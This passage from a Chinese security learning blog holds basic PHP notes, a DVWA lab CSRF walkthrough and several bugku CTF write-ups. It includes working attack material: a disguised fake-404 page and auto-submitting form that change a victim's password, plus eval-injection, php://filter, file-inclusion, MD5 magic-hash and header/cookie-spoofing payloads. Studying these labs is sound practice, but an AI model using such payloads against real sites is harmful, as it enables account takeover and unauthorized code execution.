<p>举个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeName</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Kai Jim Refsnes&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;My name is &quot;</span>;</span><br><span class="line">writeName();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个function函数还可以给函数设置一个变量<br>格式是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">a</span>(<span class="params">$b</span>)//<span class="title">b</span>是你想要改变的那个变量名</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     你要执行的指令$b;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">a(你想要改变的值);</span><br></pre></td></tr></table></figure>

<p>举个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params">$b</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;我心里的数字是&quot;</span>.$b;<span class="comment">//echo和$b中间的连接是个.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> a(<span class="number">3</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输出结果：</span><br><span class="line">我心里的数字是3</span><br></pre></td></tr></table></figure>

<p><strong>PHP返回值的问题</strong><br>首先要理解什么是返回值，什么时候需要用返回值<br>返回值，就是你运用一个函数，函数结束后，有一个结果，如果你需要那个结果，你就需要返回值<br>举个例子 比如3+5=？，在程序当中我们需要这个答案的结果，就需要返回值</p>
<p>举个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">$x,$y</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $total=$x+$y;</span><br><span class="line">    <span class="keyword">return</span> $total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;1 + 16 = &quot;</span> . add(<span class="number">1</span>,<span class="number">16</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后其他函数，遇到了再来补充</p>
]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF</title>
    <url>/2021/01/22/CSRF/</url>
    <content><![CDATA[<p><strong>感觉要写的东西蛮多的，所以单独拉出来讲一下</strong>     <a id="more"></a></p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF，全程cross-site request forgery 翻译过来就是跨站请求伪造，是指利用受害者尚未是小的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账，改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。<br><strong>理解</strong>：攻击者盗用了你的身份，以你的名义进行某些非法操作。CSRF能够使用你的账户发送邮件，获取你的敏感信息，甚至盗走你的财产</p>
<h3 id="CSRF攻击原理"><a href="#CSRF攻击原理" class="headerlink" title="CSRF攻击原理"></a>CSRF攻击原理</h3><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210121183816.png" alt="img" style="zoom:67%;">
图片来自：https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html

<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><h4 id="通过html标签发送合法跨域请求"><a href="#通过html标签发送合法跨域请求" class="headerlink" title="通过html标签发送合法跨域请求"></a>通过html标签发送合法跨域请求</h4><p>抓取正常请求的数据包，如果不存在token验证，去掉请求头中Referer字段再重新提交，如果服务器返回正常页面，基本可以确定存在CSRF漏洞<br>漏洞利用<br>通过html标签发送合法跨越请求<br>img表情不受同源策略的限制，使用img标签的src属性产生的跨域请求被浏览器认为是合法请求，诱导用户点击链接产生攻击</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;URL&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>为什么说CSRF没有获取cookie，却能利用cookie攻击？</strong><br>攻击者的网站虽然是跨域的，但是他构造的链接是源网站的，因为源网站存在CSRF，构造的链接跟源网站同源，所以浏览器自动携带cookie发起访问</p>
<h4 id="实现攻击"><a href="#实现攻击" class="headerlink" title="实现攻击"></a>实现攻击</h4><p>1.<strong>缩写URL</strong>，如果我们直接耍上<a href="http://127.0.0.1:81/DVWA-master/vulnerabilities/csrf/?password_new=hacker1&amp;password_conf=hacker1&amp;Change=Change#%E8%BF%99%E6%AE%B5%EF%BC%8C%E5%82%BB%E5%AD%90%E9%83%BD%E7%9C%8B%E5%BE%97%E5%87%BA%E6%9D%A5%E6%98%AF%E4%B8%AA%E9%99%B7%E9%98%B1%EF%BC%8C%E6%89%80%E4%BB%A5%E8%BF%99%E4%B8%AA%E6%97%B6%E5%80%99%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%BD%91%E7%BB%9C%E4%B8%8A%E7%8E%B0%E6%9C%89%E7%9A%84URL%E7%BC%A9%E5%86%99%E5%B7%A5%E5%85%B7%EF%BC%8C%E8%BF%9B%E8%A1%8C%E7%BC%A9%E5%86%99%EF%BC%8C%E4%BB%A5%E8%BE%BE%E5%88%B0%E6%AC%BA%E9%AA%97%E7%9A%84%E7%9B%AE%E7%9A%84">http://127.0.0.1:81/DVWA-master/vulnerabilities/csrf/?password_new=hacker1&amp;password_conf=hacker1&amp;Change=Change#这段，傻子都看得出来是个陷阱，所以这个时候我们可以利用网络上现有的URL缩写工具，进行缩写，以达到欺骗的目的</a><br>2.<strong>构建404网页进行欺骗</strong>这里我们可以写一段html代码，将我们的URL藏匿于其中。</p>
<h5 id="low："><a href="#low：" class="headerlink" title="low："></a>low：</h5><p>首先需要将网页放置在<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210122102136.png" alt="img" style="zoom:67%;"><br>然后构建一个网站，</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1:81/DVWA-master/vulnerabilities/csrf/?password_new=hacker1&amp;password_conf=hacker1&amp;Change=Change#&quot;</span><span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">    404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line">           file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">有<span class="tag">&lt;<span class="name">title</span>&gt;</span>记得要有<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样 当我们登录了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210122104554.png" alt="img" style="zoom:67%;"><br>这个网站后，DVWA那边的账号密码就发生了改变。还是很神奇的。</p>
<h5 id="medium："><a href="#medium：" class="headerlink" title="medium："></a>medium：</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>( stripos( $_SERVER[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,$_SERVER[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) </span><br></pre></td></tr></table></figure>

<p>stripos()函数：referer是否包含server_name中的参数<br>server_name：http包头的Host参数，及要访问的主机名<br>漏洞利用：<br>因为他比对的是referer<br>我们先看看正常修改的抓包页面：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210122140459.png" alt="img" style="zoom:80%;"></p>
<p>在HOST和referer都含有127.0.0.1:81是，通过验证，所以修改密码成功，那么再我们的CSRF页面中，</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210122135833.png" alt="img" style="zoom:67%;">
这里的Referer和原页面的不一样，那么我们该如何修改呢？，
**方法一**就是直接在文件名上动手将文件命名为何HOST一样
**但是**在这里不可行，因为文件名不能有冒号，所以在这里是行不通的
**方法二**直接burpsuit抓包，更改Referer

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210122140337.png" alt="img" style="zoom:67%;">
直接在这里添加即可，也可以绕过

<h5 id="high："><a href="#high：" class="headerlink" title="high："></a>high：</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br></pre></td></tr></table></figure>

<p>这里比对的是token，每次都会生成一个不同的token，几种常见的CSRF方式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span>&gt;</span>标签属性</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span>&gt;</span>标签属性</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>标签属性</span><br><span class="line">JavaScript方法：Image对象、XMLHTTP对象</span><br></pre></td></tr></table></figure>

<p><strong>HTML内联框架元素 (<code>&lt;iframe&gt;</code>)</strong> 表示嵌套的<a href="https://developer.mozilla.org/en-US/docs/Glossary/browsing_context">browsing context</a>。它能够将另一个HTML页面嵌入到当前页面中。详细解释<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe#example2%EF%BC%8C%E6%84%9F%E8%A7%89%E8%BF%99%E4%B8%AA%E5%92%8Cimg%E6%98%AF%E4%B8%80%E4%B8%AA%E6%84%8F%E6%80%9D%EF%BC%8C%E5%9C%A8%E7%BD%91%E9%A1%B5%E4%B8%AD%E4%BC%9A%E7%9B%B4%E6%8E%A5%E8%A2%AB&quot;%E5%BC%95%E7%94%A8%E6%88%96%E8%80%85%E8%AF%B4%E6%89%93%E5%BC%80%EF%BC%9F&quot;%E7%9A%84%E6%84%9F%E8%A7%89">https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe#example2，感觉这个和img是一个意思，在网页中会直接被&quot;引用或者说打开？&quot;的感觉</a><br>**HTML &lt;/script/&gt; **元素用于嵌入或引用可执行脚本。这通常用作嵌入或者指向 JavaScript 代码。</p>
<p><strong>所以这题要绕过反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码的页面获取关键的token。</strong><br>搜寻了一下网络上的方法，整理可得:<br>1.使用javascript脚本，在打开我们构建的危险时，脚本会通过框架偷偷打开修改密码的页面，获取其中的token，然后进行改密操作<br>但是由于涉及跨域的操作，所以这个操作也是不行滴；</p>
<p>2.利用XSS漏洞：<br>XSS还没学，等我学了再来补充吧。。。</p>
<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><h4 id="引语："><a href="#引语：" class="headerlink" title="引语："></a>引语：</h4><p>任何的web脚本语言都可以选择以何种请求来接受数据，有$_GET $_POST $_REQUEST.</p>
<h4 id="get型："><a href="#get型：" class="headerlink" title="get型："></a>get型：</h4><p>DVWA中，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$pass_new = $_GET[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">$pass_conf = $_GET[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br></pre></td></tr></table></figure>

<p>这里的数据就是get类型的，所以html页面的构建，像上面一样即可</p>
<h4 id="POST型"><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h4><p>如何构建网页呢？</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1:81/DVWA-master/vulnerabilities/csrf/&quot;</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker1&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker1&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Change&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Change&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.forms[<span class="number">0</span>]sumit();<span class="comment">//这里是用了一个自动提交的脚本</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="使用burpsuit进行扫描"><a href="#使用burpsuit进行扫描" class="headerlink" title="使用burpsuit进行扫描:"></a>使用burpsuit进行扫描:</h4>]]></content>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku1&amp;攻防世界</title>
    <url>/2020/12/15/bugku1/</url>
    <content><![CDATA[<h3 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h3><p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201215180338.png" alt="img"></p>
<p>就给了个这个 啥也无，所以就要想该如何获得flag, 我们看到   <a id="more"></a><br><strong>$_REQUEST()函数</strong> 他既可以接受get也可以接收post数据，所以 在这里，他的意思是获得一个hello的数据，所以我们就需要所以 我们在URL里面输入的时候就需要输入?hello=多少 然后这个多少会被代入到eval里面执行<br>而我们对<strong>eval</strong>这个函数也不陌生了，他是将你输入的字符串转化为PHP代码来执行，但是两段命令之间需要用分号来隔开，而在这题中，他的flag似乎是包含在flag.php的文件夹中的，要获取flag就需要输出这个文件夹的内容：<br>构建payload：<a href="http://114.67.246.176:10770/?hello=1);print_r(file(&quot;./flag.php&quot;)">http://114.67.246.176:10770/?hello=1);print_r(file(&quot;./flag.php&quot;)</a><br>为什么可以使用print_r和var_dump而不使用echo呢？<br>原因：前两个还可以输出复杂的数组类型 而echo仅能输出变量或字符串</p>
<p>12.18日看完黑盾被赛前培训思考：</p>
<h3 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h3><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201215213959.png" alt="img" style="zoom:67%;">
在这题当中，我们看了一下代码 首先用了一个正则表达式，意思是如果在提交上来的值中包含不是字母或者数字的东西，将会被args error，那么我们在看下面<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201215214300.png" alt="img" style="zoom: 50%;">
资料来源：https://blog.csdn.net/anjiaowangmenghan/article/details/76460872
所以我们可以知道当有两个$$的时候 第一个是为$args 假设我们让$args=as 那么最终就会变成 $as 那么就会执行$**这个变量所表示的值，那么再本题中，我们可以就可以利用这点，让他执行一个全局数组变量，也就是$GLOBALS

<p><strong>$GLOBALS **<br>— 引用全局作用域中可用的全部变量<br>**说明</strong><br>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。<br><strong>注意</strong>: <strong>变量可用性</strong>与所有其他<a href="https://www.php.net/manual/zh/language.variables.superglobals.php">超全局变量</a>不同，$GLOBALS在PHP中总是可用的。<br>所以当我们调用$GLOBALS的时候，输出的将会是所有数组<br>构建payload：<br><a href="http://114.67.246.176:11872/?args=GLOBALS">http://114.67.246.176:11872/?args=GLOBALS</a><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201215215501.png" alt="img" style="zoom:50%;"></p>
<p>好的这样就行了</p>
<h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>是否留下后门？<br>要看是否留下后门我们要从哪里突破？根据那个教学视频，我们可以看看这个网站的网站目录<br>看看有没有其他目录，这个时候我们就使用到一个叫做御剑的软件，是一个后台网站爆破的软件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201218163128.png" alt="img" style="zoom:67%;"><br>可以看到 它是由一个shell.php的网站的，那么这个时候我们打开一下这个shell.php试试<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201218163356.png" alt="img"></p>
<p>他需要我们输入PASS  这个时候我们可以直接用burp suit进行暴力破解即可<br>PS:index.php 主体网站</p>
<h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201216003913.png" alt="img"><br>在查看网页源代码的时候发现了这个 一个好像是经过加密的东西 然后我就去解码，发现是base64的编码，然后解码完后是test123  然后再看网页<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201216004034.png" alt="img" style="zoom:67%;"><br>是需要我们输入管理员的账号和密码的，然后我们盲猜一波账号是admin 密码是这个试试</p>
<p>但是他一直说IP禁止访问，然后查了一下资料说是要用伪造一个XFF进行登录<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201216004935.png" alt="img" style="zoom: 50%;"><br>大概是这样的<br>问题1：<strong>XFF是什么</strong>？<br>XFF是header请求头中的一个参数<br> 是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。<br> 代表了HTTP的请求端真实的IP。</p>
<p>问题2：<strong>为什么看到IP被禁止可以想到伪造XFF？</strong><br>IP被禁止了，我们想要继续访问，可以通过伪造XFF来绕过服务器ip的过滤进行访问</p>
<h3 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h3><p>正常用LFI去读/sqli/db.php文件 是无法读取它的源码 它会被当做php文件被执行<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201216131959.png" alt="img" style="zoom:67%;"></p>
<p>将只会输出结果 这个时候我们就可以使用php://filter<br>构造payload:?file=php://filter/read=convert.base64-encode/resource=index.php</p>
<p><strong>php://filter</strong><br>在PHP官网上的解释是：<br>它是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式的文件函数非常有用，类似readfile()、file()和file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器<br><strong>php://filter</strong>目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201216131547.png" alt="img"></p>
<p>筛选过滤应用： </p>
<p>1、 字符串过滤器：</p>
<ul>
<li>string.rot13 对字符串执行ROT13转换</li>
<li>string.toupper转换为大写</li>
<li>string.tolower 转换为小写</li>
<li>string.strip_tags去除html和php标记</li>
</ul>
<p>2、 转换过滤器：</p>
<ul>
<li><strong>convert.base64-encode &amp; convert.base64-decode</strong> <strong>：**</strong>base64编码和解码**</li>
<li><strong>convert.quoted-printable-encode &amp; convert.quoted-printable-decode**</strong>：**将 quoted-printable 字符串转换为 8-bit 字符串</li>
</ul>
<p>3、 压缩过滤器：</p>
<ul>
<li><em>zlib.deflate**</em>和** <em>zlib.inflate</em></li>
<li><em>bzip2.compress**</em>和** <em>bzip2.decompress</em></li>
</ul>
<p>4、 加密过滤器：</p>
<ul>
<li><p>mcrypt.tripledes和mdecrypt.tripledes等<br>资料来源：<a href="https://www.cnblogs.com/natian-ws/p/7242477.html">https://www.cnblogs.com/natian-ws/p/7242477.html</a></p>
<h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><p><strong>ini_set()函数</strong>：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201216180123.png" alt="img"></p>
</li>
</ul>
<p>不显示报错信息<br><strong>strstr()函数：</strong><br>strstr(<em>string,search,before_search</em>)<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201216180618.png" alt="img" style="zoom:67%;"><br>资料来源：<a href="https://www.runoob.com/php/func-string-strstr.html">https://www.runoob.com/php/func-string-strstr.html</a><br>所以我们可以知道<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201216180709.png" alt="img"></p>
<p>这句话的意思是 从提交上来的url字符串中搜索， 搜索？以后的内容，所以$str=?=…..</p>
<p><strong>substr()函数</strong>这个函数我们之前已经遇到过了，但是上一次没有学清楚我觉得<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201216180933.png" alt="img"></p>
<p>语法：substr(string,start,length)<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201216181112.png" alt="img" style="zoom:67%;"><br>所以说 在这句话中它的意思是返回从第一个字符开始往后的内容<br>所以我们最后这个substr==。。。。。<br>然后是<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201216182318.png" alt="img"></p>
<p>srt_replace就是一个正则替换吧 他的意思是吧key换成无值<br>**parse_str()**函数<br>语法：parse_str(string,array)’//后面的array可不选，选了以后意思是将string中的字符串数组变量存储到定义的array这个数组当中<br>他的作用是将查询字符串解析到变量中<br>举个例子吧<br>parse_str(“name=hh&amp;age=18”);<br>echo $name;<br>echo $age; 这样的结果是 hh 和18；</p>
<p>那么这题究竟什么意思呢？</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> md5($key1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> md5($key2);</span><br><span class="line"><span class="keyword">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag.<span class="string">&quot;取得flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>他的意思就是 我输入两个key 在经过去掉问号去掉key以后 如果两个的md5值相等，但是两个key本身不相等那就输出flag<br>所以我需要找两个MD5值相等的字符串：<br>思路1.如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。（也就是我使用的方法）</p>
<p>下列的字符串的MD5值都是0e开头的：</p>
<p>QNKCDZO</p>
<p>240610708</p>
<p>s878926199a</p>
<p>s155964671a</p>
<p>s214587387a</p>
<p>s214587387a<br>index.php?kekeyy1=QNKCDZO&amp;kekeyy2=240610708</p>
<p>2.md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。<br> 所以可以输入：<code>http://120.24.86.145:8002/web16/index.php?kekeyy1[]=something&amp;kekeyy2[]=anything</code><br>资料来源：<a href="https://www.cnblogs.com/yuluoluo/p/9782327.html">https://www.cnblogs.com/yuluoluo/p/9782327.html</a></p>
<h2 id="web-php-include"><a href="#web-php-include" class="headerlink" title="web-php-include"></a>web-php-include</h2><h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a><strong>文件包含漏洞</strong></h2><p><strong>文件包含简介：</strong><br>服务器执行PHP代码的时候，可以通过<strong>文件包含函数</strong>加载另一个文件夹中的PHP代码，并且当PHP来执行<br>，这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。<br><strong>文件包含函数</strong><br>require()<br>require_once()<br>include()<br>include_once()</p>
<p><code>include</code> 和<code>require</code>区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
<p><strong>漏洞产生原因：</strong><br>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line">$filename  = $_GET[<span class="string">&#x27;filename&#x27;</span>];   </span><br><span class="line"><span class="keyword">include</span>($filename); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>例如：<br><code>$_GET[&#39;filename&#39;]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p>
<p>漏洞分类：</p>
<h4 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h4><p><code>1.无限制本地文件包含漏洞</code><br><code>2.session文件包含漏洞</code><br><code>3.有限制本地文件包含漏洞绕过</code></p>
<h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p><code>1.无限制远程文件包含漏洞</code><br><code>2有限制远程文件包含漏洞绕过</code><br><code>3.问号井号绕过</code></p>
<p>参考资料：<a href="https://www.freebuf.com/news/182280.html">https://www.freebuf.com/news/182280.html</a></p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20201218200955.png" alt="img"></p>
<p>分析源码：<br>show source（）展示文件，文本中高亮的部分<br>include（），加载$page这个变量当中所指向的文件夹中的代码<br>str_replace：正则替换，过滤掉php：//<br>strstr()：前面遇过，就是搜素<br>所以代码是这样的，输出的是hello参数，而被加载文件文本代码的是$page变量中的内容<br><strong>思路</strong>：我们的思路是，让$page所得到的内容经由hello显示出来</p>
<p>在看黑盾杯的教学视频中<br>实在不懂为啥可以?page=<a href="http://127.0.0.1/index.php/?hello=">http://127.0.0.1/index.php/?hello=</a><?system(%22ls%22);?><br>所以就先跳过这个方法吧。<br><strong>方法一</strong>：<br>使用php://input封装协议<br>感觉这个思想挺巧妙的，这个php://input可以让page读取我们用post上传的文件（我们写一段完整代码也是一个文件<br>然后因为这边有过滤，所以我们就可以使用那几钟绕过方式这边使用大小写绕过：我无语了 粘贴复制画面都无反应感觉很多代码都没陌生，我认为还是继续去刷upload-labs吧，后面多学点再来补充吧</p>
<h3 id="web20"><a href="#web20" class="headerlink" title="web20:"></a>web20:</h3><p>打开网页，是一串字母，看着不像被加密过的<br>再看看URL </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">?line=&amp;filename=a2V5cy50eHQ=</span><br></pre></td></tr></table></figure>

<p>a2V5cy50eHQ=像是被base64加密过得<br>解码后得：keys.txt<br>用御剑扫描后台发现有keys.txt</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210130122906.png" alt="img" style="zoom:67%;">
推测可得，网页存在文件包含漏洞
?line代表的是行数 默认是第一行 后面的filename是文件名，接下来就是尝试了:
读取一下index.php文件试试，先将其用base64进行编码，然后输入到url中，在一行行查看代码中，我们发现在后面有说一个

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;margin&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;margin&#x27;</span>]==<span class="string">&#x27;margin&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>，就可以看keys.php，那么让我们伪造试试</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210130123858.png" alt="img" style="zoom:67%;">
好的成功

<h3 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h3><p>查看网页源码，感觉没啥，然后只能看看有什么信息能利用，使用御剑，看看有没有其他后台，发现没有收获，看了下题解，网页源码有一个1p.html，直接访问，发现会跳转，可以推测出其源码有href属性，然后直接<br>view-source:<a href="http://114.67.246.176:16013/1p.html%EF%BC%8C">http://114.67.246.176:16013/1p.html，</a><br><strong>使用view-source前缀</strong><br>即可直接查看网页源码，发现script使用了urlcode，经过解码，是</p>
